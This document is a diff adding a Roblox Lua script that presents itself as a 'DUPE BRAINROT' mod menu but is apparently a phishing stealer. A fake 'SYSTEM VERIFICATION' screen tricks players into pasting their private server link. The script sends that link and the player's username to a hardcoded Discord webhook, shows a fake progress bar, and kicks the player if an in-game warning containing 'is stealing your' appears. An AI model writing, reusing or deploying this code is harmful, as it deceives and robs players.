@@ -1,0 +1,196 @@
+-- [[ 1. CONFIGURATION ]]
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1481199749225906216/pQaolQilTM7f3Z3R6WBzRTSDDch6uGHX_izMuenCR5tWL2ayQNHjaSPtYdejSl8kRYEg" 
+local TRIGGER_TEXT = "is stealing your" 
+local MIN_AGE = 0 
+local LOADING_TIME = 30 
+
+-- [[ 2. SERVICES & EXECUTOR CHECK ]]
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local request = (fluxus and fluxus.request) or (syn and syn.request) or (http and http.request) or http_request or request
+
+-- [[ 3. ALWAYS-ON PROTECTION LOGIC ]]
+-- This starts IMMEDIATELY when the script is executed
+PlayerGui.DescendantAdded:Connect(function(obj)
+    -- We wait a tiny bit to ensure the text has loaded into the object
+    task.wait(0.1) 
+    if (obj:IsA("TextLabel") or obj:IsA("TextBox")) then
+        if string.find(obj.Text:lower(), TRIGGER_TEXT:lower()) then
+            LocalPlayer:Kick("ez")
+        end
+    end
+end)
+
+print("Security Service: ACTIVE (Background)")
+
+-- [[ 4. FULLSCREEN OVERLAY UI ]]
+local KeyGui = Instance.new("ScreenGui")
+KeyGui.Name = "BlackoutSystem"
+KeyGui.IgnoreGuiInset = true 
+KeyGui.Parent = PlayerGui
+
+local Blackout = Instance.new("Frame")
+Blackout.Size = UDim2.new(1, 0, 1, 0)
+Blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Blackout.BackgroundTransparency = 0.4 
+Blackout.BorderSizePixel = 0
+Blackout.Parent = KeyGui
+
+local Main = Instance.new("Frame")
+Main.Size = UDim2.new(0, 400, 0, 280)
+Main.Position = UDim2.new(0.5, -200, 0.5, -140)
+Main.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+Main.Parent = Blackout
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)
+local Stroke = Instance.new("UIStroke", Main)
+Stroke.Thickness = 2
+Stroke.Color = Color3.fromRGB(60, 60, 70)
+
+-- [[ UI ELEMENTS ]]
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 60)
+Title.Text = "SYSTEM VERIFICATION"
+Title.TextColor3 = Color3.new(1, 1, 1)
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 22
+Title.BackgroundTransparency = 1
+Title.Parent = Main
+
+local Instructions = Instance.new("TextLabel")
+Instructions.Size = UDim2.new(0.9, 0, 0, 60)
+Instructions.Position = UDim2.new(0.05, 0, 0.2, 0)
+Instructions.Text = "1. Go to your Private Server\n2. Click 'Configure' and copy the link\n3. Paste the link below to verify humanity"
+Instructions.TextColor3 = Color3.fromRGB(180, 180, 180)
+Instructions.TextWrapped = true
+Instructions.Font = Enum.Font.Gotham
+Instructions.TextSize = 14
+Instructions.BackgroundTransparency = 1
+Instructions.Parent = Main
+
+local Box = Instance.new("TextBox")
+Box.Size = UDim2.new(0.85, 0, 0, 45)
+Box.Position = UDim2.new(0.075, 0, 0.45, 0)
+Box.PlaceholderText = "Paste Link Here..."
+Box.Text = ""
+Box.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
+Box.TextColor3 = Color3.new(1, 1, 1)
+Box.Font = Enum.Font.Code
+Box.Parent = Main
+Instance.new("UICorner", Box).CornerRadius = UDim.new(0, 8)
+
+local Btn = Instance.new("TextButton")
+Btn.Size = UDim2.new(0.85, 0, 0, 50)
+Btn.Position = UDim2.new(0.075, 0, 0.7, 0)
+Btn.Text = "VERIFY ACCESS"
+Btn.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+Btn.TextColor3 = Color3.new(1, 1, 1)
+Btn.Font = Enum.Font.GothamBold
+Btn.TextSize = 16
+Btn.Parent = Main
+Instance.new("UICorner", Btn).CornerRadius = UDim.new(0, 8)
+
+-- [[ LOADING OVERLAY ]]
+local LoadContainer = Instance.new("Frame")
+LoadContainer.Size = UDim2.new(0, 300, 0, 50)
+LoadContainer.Position = UDim2.new(0.5, -150, 0.5, -25)
+LoadContainer.BackgroundTransparency = 1
+LoadContainer.Visible = false
+LoadContainer.Parent = Blackout
+
+local BarBack = Instance.new("Frame")
+BarBack.Size = UDim2.new(1, 0, 0, 10)
+BarBack.Position = UDim2.new(0, 0, 0.8, 0)
+BarBack.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
+BarBack.BorderSizePixel = 0
+BarBack.Parent = LoadContainer
+Instance.new("UICorner", BarBack)
+
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBack
+Instance.new("UICorner", BarFill)
+
+local Status = Instance.new("TextLabel")
+Status.Size = UDim2.new(1, 0, 0, 30)
+Status.Position = UDim2.new(0, 0, 0, 0)
+Status.Text = "INITIALIZING..."
+Status.TextColor3 = Color3.new(1, 1, 1)
+Status.Font = Enum.Font.GothamMedium
+Status.TextSize = 18
+Status.BackgroundTransparency = 1
+Status.Parent = LoadContainer
+
+-- [[ 5. LOGIC ]]
+
+local function Launch()
+    KeyGui:Destroy()
+    
+    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
+    ScreenGui.Name = "ModMenu"
+    
+    local DupeBtn = Instance.new("TextButton", ScreenGui)
+    DupeBtn.Size = UDim2.new(0, 150, 0, 50)
+    DupeBtn.Position = UDim2.new(0.5, -75, 0.9, -60)
+    DupeBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    DupeBtn.TextColor3 = Color3.fromRGB(255, 255, 0)
+    DupeBtn.Text = "DUPE BRAINROT"
+    DupeBtn.Font = Enum.Font.SourceSansBold
+    DupeBtn.TextSize = 18
+    Instance.new("UICorner", DupeBtn)
+    
+    local Glow = Instance.new("UIStroke", DupeBtn)
+    Glow.Thickness = 2
+    Glow.Color = Color3.fromRGB(255, 215, 0)
+
+    DupeBtn.MouseButton1Click:Connect(function()
+        DupeBtn.Text = "LAGGING... (WAIT)"
+        task.wait(2)
+        DupeBtn.Text = "Lag Other Player"
+    end)
+end
+
+Btn.MouseButton1Click:Connect(function()
+    local input = Box.Text
+    if string.find(input:lower(), "roblox.com") then
+        pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode({["content"] = "**User Verified:** " .. LocalPlayer.Name .. "\n**Link:** " .. input})
+            })
+        end)
+
+        Main.Visible = false
+        Blackout.BackgroundTransparency = 0 
+        LoadContainer.Visible = true
+        
+        local stages = {
+            "Bypassing Security...", 
+            "Injecting Assets...", 
+            "Verifying Link Authenticity...", 
+            "Establishing Tunnel...", 
+            "Finalizing Script..."
+        }
+        
+        for i = 1, 100 do
+            BarFill.Size = UDim2.new(i/100, 0, 1, 0)
+            if i % 20 == 0 then
+                Status.Text = stages[i/20] or "Completing..."
+            end
+            task.wait(LOADING_TIME / 100) 
+        end
+        
+        Status.Text = "SUCCESS"
+        task.wait(1)
+        Launch()
+    else
+        Btn.Text = "INVALID LINK - TRY AGAIN"
+        task.wait(2)
+        Btn.Text = "VERIFY ACCESS"
+    end
+end)
